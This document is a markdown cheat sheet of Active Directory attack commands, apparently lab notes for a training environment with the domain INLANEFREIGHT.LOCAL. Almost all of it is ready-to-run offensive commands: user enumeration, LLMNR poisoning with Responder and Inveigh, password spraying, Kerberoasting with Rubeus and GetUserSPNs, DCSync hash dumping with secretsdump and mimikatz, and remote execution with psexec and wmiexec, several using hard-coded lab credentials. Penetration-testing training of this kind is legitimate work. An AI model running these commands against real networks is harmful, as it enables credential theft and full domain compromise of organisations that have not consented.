# FPing
```bash
fping -asgq 172.16.5.0/23

sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

# kerbrute
```bash
# jsmith.txt/jsmith2.txt
git clone https://github.com/insidetrust/statistically-likely-usernames

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

# Responder
```bash
sudo respondr -I tun0 -v
```

# Inveigh
```powershell
.\inveigh.exe

# press ESC and ENTER in Inveigh
GET NTLMV2UNIQUE

GET NTLMV2USERNAMES
```

# password policy
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```
```bash
enum4linux -P 172.16.5.5

enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
```powershell
net use \\DC01\ipc$ "" /u:""
```
```bash
ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
```powershell
net accounts
```
```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```

# Enumerate Users
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

crackmapexec smb 172.16.5.5 --users

ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers
```

# Password Spaying
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

# Credential Enumertaion
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
```
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers

rpcclient $> queryuser 0x457
```
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```
```powershell
Import-Module ActiveDirectory

Get-Module

Get-ADDomain

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Get-ADTrust -Filter *

Get-ADGroup -Filter * | select name

Get-ADGroup -Identity "Backup Operators"

Get-ADGroupMember -Identity "Backup Operators"
```
```powershell
import-module powerview.ps1

Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```
```powershell
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```
```
.\SharpHound.exe -c All --zipfilename ILFREIGHT

Find Computers with Unsupported Operating Systems

Find Computers where Domain Users are Local Admin
```

# Kerberoasting
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
```powershell
.\Rubeus.exe kerberoast /stats

.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```

# DCsync Decrypted passwords
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
```
runas /netonly /user:INLANEFREIGHT\adunn powershell

Import-Module ActiveDirectory

Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} -Properties AllowReversiblePasswordEncryption | Select-Object SamAccountName, Name

.\mimikatz.exe

mimikatz # privilege::debug

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

# RDP
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
```powershell
. .\powerview.ps1

Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

Get-DomainComputer | ForEach-Object {Get-NetLocalGroupMember -ComputerName $_.dnshostname -GroupName "Remote Management Users"}
```

# MSSQL
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
```powershell
cd .\PowerUpSQL\

Import-Module .\PowerUpSQL.ps1

Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```
